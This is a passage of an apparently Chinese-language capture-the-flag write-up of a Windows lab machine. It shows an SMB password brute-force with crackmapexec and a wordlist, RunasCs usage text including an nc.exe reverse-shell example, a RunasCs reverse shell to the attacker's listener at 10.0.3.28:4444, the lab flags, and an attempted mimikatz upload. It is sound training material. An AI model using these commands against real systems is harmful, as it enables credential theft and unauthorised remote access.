obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INFORMACIàN DE PRIVILEGIOS</span><br><span class="line">--------------------------</span><br><span class="line"></span><br><span class="line">Nombre de privilegio          Descripci¢n                                  Estado</span><br><span class="line">============================= ============================================ ==========</span><br><span class="line">SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada</span><br><span class="line">SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\nica\Documents&gt; </span><br></pre></td></tr></table></figure>
<p>用户目录下获得 user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\nica\Documents&gt; <span class="built_in">cd</span> ~</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Users\nica&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directorio: C:\Users\nica</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Desktop</span><br><span class="line">d-r---        9/26/2023   6:44 PM                Documents</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Downloads</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Favorites</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Links</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Music</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Pictures</span><br><span class="line">d-----        9/15/2018   9:12 AM                Saved Games</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Videos</span><br><span class="line">-a----        9/26/2023   6:44 PM             10 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\nica&gt; <span class="built_in">type</span> user.txt</span><br><span class="line">HMVWINGIFT</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica&gt; </span><br></pre></td></tr></table></figure>
<h3 id="提权">2.2. 提权</h3>
<p>查询系统用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\nica&gt; net user </span><br><span class="line"></span><br><span class="line">Cuentas de usuario de \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrador            akanksha                 DefaultAccount</span><br><span class="line">Invitado                 nica                     WDAGUtilityAccount</span><br><span class="line">El comando se ha completado con uno o m s errores.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>akanksha</code> 用户可成功爆破获得 SMB 密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># crackmapexec smb 10.0.3.29 -u akanksha -p rockyou.txt </span></span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:123456 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:12345 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:123456789 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:password STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:iloveyou STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:princess STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:1234567 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:rockyou STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:12345678 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:abc123 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:nicole STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:daniel STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:babygirl STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:monkey STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:lovely STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:jessica STATUS_LOGON_FAILURE</span><br><span class="line">………………</span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:shalom STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:ruben STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:platinum STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:leticia STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:german STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:snowman STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:romero STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:madeline STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:dulce STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:turkey STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.0.3.29       445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:sweetgirl</span><br></pre></td></tr></table></figure>
<p>SMB 测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># smbmap -u &#x27;akanksha&#x27; -p &#x27;sweetgirl&#x27; -H 10.0.3.29 </span></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          </span><br><span class="line">                                                                                                                             </span><br><span class="line">[+] IP: 10.0.3.29:445   Name: 10.0.3.29                 Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Admin remota</span><br><span class="line">        C$                                                      NO ACCESS       Recurso predeterminado</span><br><span class="line">        IPC$                                                    READ ONLY       IPC remota</span><br><span class="line">[*] Closed 1 connections                                    </span><br></pre></td></tr></table></figure>
<p>但 WinRM 连接不上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># evil-winrm -i 10.0.3.29 -u &#x27;akanksha&#x27; -p &#x27;sweetgirl&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">                                        </span><br><span class="line">Error: An error of <span class="built_in">type</span> WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError</span><br><span class="line">                                        </span><br><span class="line">Error: Exiting with code 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看了其他师傅的 wp 是利用 RunasCs【<a
target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs">GitHub -
antonioCoco/RunasCs: RunasCs - Csharp and open version of windows
builtin runas.exe</a>】进一步提权的</p>
<blockquote>
<p><em>RunasCs</em> is an utility to run specific processes with
different permissions than the user's current logon provides using
explicit credentials. This tool is an improved and open version of
windows builtin <em>runas.exe</em> that solves some limitations:</p>
<ul>
<li>Allows explicit credentials</li>
<li>Works both if spawned from interactive process and from service
process</li>
<li>Manage properly <em>DACL</em> for <em>Window
Stations</em> and <em>Desktop</em> for the creation of the new
process</li>
<li>Uses more reliable create process functions
like <code>CreateProcessAsUser()</code> and <code>CreateProcessWithTokenW()</code> if
the calling process holds the required privileges (automatic
detection)</li>
<li>Allows to specify the logon type, e.g. 8-NetworkCleartext logon
(no <em>UAC</em> limitations)</li>
<li>Allows to bypass UAC when an administrator password is known (flag
--bypass-uac)</li>
<li>Allows to create a process with the main thread impersonating the
requested user (flag --remote-impersonation)</li>
<li>Allows
redirecting <em>stdin</em>, <em>stdout</em> and <em>stderr</em> to a
remote host</li>
<li>It's Open Source :)</li>
</ul>
<p><em>RunasCs</em> has an automatic detection to determine the best
create process function for every contexts. Based on the process caller
token permissions, it will use one of the create process function in the
following preferred order:</p>
<ol type="1">
<li><code>CreateProcessAsUserW()</code></li>
<li><code>CreateProcessWithTokenW()</code></li>
<li><code>CreateProcessWithLogonW()</code></li>
</ol>
</blockquote>
<p>简言之，在 A 用户下通过提供 B 用户的凭证可以创建运行 B
用户权限的特定进程【提权】</p>
<p>Usage</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">RunasCs v1.5 - @splinter_code</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">    RunasCs is an utility to run specific processes under a different user account</span><br><span class="line">    by specifying explicit credentials. In contrast to the default runas.exe <span class="built_in">command</span></span><br><span class="line">    it supports different logon types and CreateProcess* <span class="built_in">functions</span> to be used, depending</span><br><span class="line">    on your current permissions. Furthermore it allows input/output redirection (even</span><br><span class="line">    to remote hosts) and you can specify the password directly on the <span class="built_in">command</span> line.</span><br><span class="line"></span><br><span class="line">Positional arguments:</span><br><span class="line">    username                username of the user</span><br><span class="line">    password                password of the user</span><br><span class="line">    cmd                     commandline <span class="keyword">for</span> the process</span><br><span class="line"></span><br><span class="line">Optional arguments:</span><br><span class="line">    -d, --domain domain</span><br><span class="line">                            domain of the user, <span class="keyword">if</span> <span class="keyword">in</span> a domain.</span><br><span class="line">                            Default: <span class="string">&quot;&quot;</span></span><br><span class="line">    -f, --<span class="keyword">function</span> create_process_function</span><br><span class="line">                            CreateProcess <span class="keyword">function</span> to use. When not specified</span><br><span class="line">                            RunasCs determines an appropriate CreateProcess</span><br><span class="line">                            <span class="keyword">function</span> automatically according to your privileges.</span><br><span class="line">                            0 - CreateProcessAsUserW</span><br><span class="line">                            1 - CreateProcessWithTokenW</span><br><span class="line">                            2 - CreateProcessWithLogonW</span><br><span class="line">    -l, --logon-type logon_type</span><br><span class="line">                            the logon <span class="built_in">type</span> <span class="keyword">for</span> the token of the new process.</span><br><span class="line">                            Default: <span class="string">&quot;2&quot;</span> - Interactive</span><br><span class="line">    -t, --<span class="built_in">timeout</span> process_timeout</span><br><span class="line">                            the waiting time (<span class="keyword">in</span> ms) <span class="keyword">for</span> the created process.</span><br><span class="line">                            This will halt RunasCs <span class="keyword">until</span> the spawned process</span><br><span class="line">                            ends and sent the output back to the <span class="built_in">caller</span>.</span><br><span class="line">                            If you <span class="built_in">set</span> 0 no output will be retrieved and a</span><br><span class="line">                            background process will be created.</span><br><span class="line">                            Default: <span class="string">&quot;120000&quot;</span></span><br><span class="line">    -r, --remote host:port</span><br><span class="line">                            redirect stdin, stdout and stderr to a remote host.</span><br><span class="line">                            Using this option sets the process_timeout to 0.</span><br><span class="line">    -p, --force-profile</span><br><span class="line">                            force the creation of the user profile on the machine.</span><br><span class="line">                            This will ensure the process will have the</span><br><span class="line">                            environment variables correctly <span class="built_in">set</span>.</span><br><span class="line">                            WARNING: If non-existent, it creates the user profile</span><br><span class="line">                            directory <span class="keyword">in</span> the C:\Users folder.</span><br><span class="line">    -b, --bypass-uac</span><br><span class="line">                            try a UAC bypass to spawn a process without</span><br><span class="line">                            token limitations (not filtered).</span><br><span class="line">    -i, --remote-impersonation</span><br><span class="line">                            spawn a new process and assign the token of the</span><br><span class="line">                            logged on user to the main thread.</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">    Run a <span class="built_in">command</span> as a <span class="built_in">local</span> user</span><br><span class="line">        RunasCs.exe user1 password1 <span class="string">&quot;cmd /c whoami /all&quot;</span></span><br><span class="line">    Run a <span class="built_in">command</span> as a domain user and logon <span class="built_in">type</span> as NetworkCleartext (8)</span><br><span class="line">        RunasCs.exe user1 password1 <span class="string">&quot;cmd /c whoami /all&quot;</span> -d domain -l 8</span><br><span class="line">    Run a background process as a <span class="built_in">local</span> user,</span><br><span class="line">        RunasCs.exe user1 password1 <span class="string">&quot;C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe&quot;</span> -t 0</span><br><span class="line">    Redirect stdin, stdout and stderr of the specified <span class="built_in">command</span> to a remote host</span><br><span class="line">        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444</span><br><span class="line">    Run a <span class="built_in">command</span> simulating the /netonly flag of runas.exe</span><br><span class="line">        RunasCs.exe user1 password1 <span class="string">&quot;cmd /c whoami /all&quot;</span> -l 9</span><br><span class="line">    Run a <span class="built_in">command</span> as an Administrator bypassing UAC</span><br><span class="line">        RunasCs.exe adm1 password1 <span class="string">&quot;cmd /c whoami /priv&quot;</span> --bypass-uac</span><br><span class="line">    Run a <span class="built_in">command</span> as an Administrator through remote impersonation</span><br><span class="line">        RunasCs.exe adm1 password1 <span class="string">&quot;cmd /c echo admin &gt; C:\Windows\admin&quot;</span> -l 8 --remote-impersonation</span><br></pre></td></tr></table></figure>
<p>Kali 开个监听，利用 RunasCs 往 Kali 重定向个 cmd</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\nica&gt; C:\Users\nica\RunasCs.exe akanksha sweetgirl  cmd.exe -r 10.0.3.28:4444</span><br><span class="line"></span><br><span class="line">[+] Running <span class="keyword">in</span> session 0 with process <span class="keyword">function</span> CreateProcessWithLogonW()</span><br><span class="line">[+] Using Station\Desktop: Service-0x0-c3088b$\Default</span><br><span class="line">[+] Async process <span class="string">&#x27;C:\Windows\system32\cmd.exe&#x27;</span> with pid 2720 created <span class="keyword">in</span> background.</span><br><span class="line">*Evil-WinRM* PS C:\Users\nica&gt;</span><br></pre></td></tr></table></figure>
<p>效果</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410172030132.jpg" /></p>
<p><code>akanksha</code> 用户归属管理员组，进一步查询得 root.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">c:\Users&gt;<span class="built_in">dir</span> Administrador</span><br><span class="line"><span class="built_in">dir</span> Administrador</span><br><span class="line"> El volumen de la unidad C no tiene etiqueta.</span><br><span class="line"> El n�mero de serie del volumen es: 26CD-AE41</span><br><span class="line"></span><br><span class="line"> Directorio de c:\Users\Administrador</span><br><span class="line"></span><br><span class="line">26/09/2023  18:36    &lt;DIR&gt;          .</span><br><span class="line">26/09/2023  18:36    &lt;DIR&gt;          ..</span><br><span class="line">26/09/2023  15:11    &lt;DIR&gt;          3D Objects</span><br><span class="line">26/09/2023  15:11    &lt;DIR&gt;          Contacts</span><br><span class="line">26/09/2023  15:11    &lt;DIR&gt;          Desktop</span><br><span class="line">26/09/2023  15:11    &lt;DIR&gt;          Documents</span><br><span class="line">26/09/2023  15:11    &lt;DIR&gt;          Downloads</span><br><span class="line">26/09/2023  15:11    &lt;DIR&gt;          Favorites</span><br><span class="line">26/09/2023  15:11    &lt;DIR&gt;          Links</span><br><span class="line">26/09/2023  15:11    &lt;DIR&gt;          Music</span><br><span class="line">26/09/2023  15:24            16.418 new.cfg</span><br><span class="line">26/09/2023  15:11    &lt;DIR&gt;          Pictures</span><br><span class="line">26/09/2023  18:36                13 root.txt</span><br><span class="line">26/09/2023  15:11    &lt;DIR&gt;          Saved Games</span><br><span class="line">26/09/2023  15:11    &lt;DIR&gt;          Searches</span><br><span class="line">26/09/2023  15:11    &lt;DIR&gt;          Videos</span><br><span class="line">               2 archivos         16.431 bytes</span><br><span class="line">              14 <span class="built_in">dirs</span>  45.384.331.264 bytes libres</span><br><span class="line"></span><br><span class="line">c:\Users&gt;<span class="built_in">cd</span> Administrador</span><br><span class="line"><span class="built_in">cd</span> Administrador</span><br><span class="line"></span><br><span class="line">c:\Users\Administrador&gt;<span class="built_in">type</span> root.txt</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br><span class="line">HMV1STWINDOWZ</span><br><span class="line">c:\Users\Administrador&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="补充">2.3. 补充</h3>
<p>本想利用 mimikatz
进一步分析，上传后没法正常执行，且相关文件会被自动删除</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\nica&gt; <span class="built_in">mkdir</span> mimikatz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directorio: C:\Users\nica</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----       10/17/2024   8:34 PM                mimikatz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\nica&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directorio: C:\Users\nica</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Desktop</span><br><span class="line">d-r---        9/26/2023   6:44 PM                Documents</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Downloads</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Favorites</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Links</span><br><span class="line">d-----       10/17/2024   8:34 PM                mimikatz</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Music</span><br><span class="line">d-r---        9/15/2018   9:12 AM                Pictures</span><br><span class="line">d-----        9/15/2018   9:12 AM                Saved Games</span><br><span class="line">d-r---        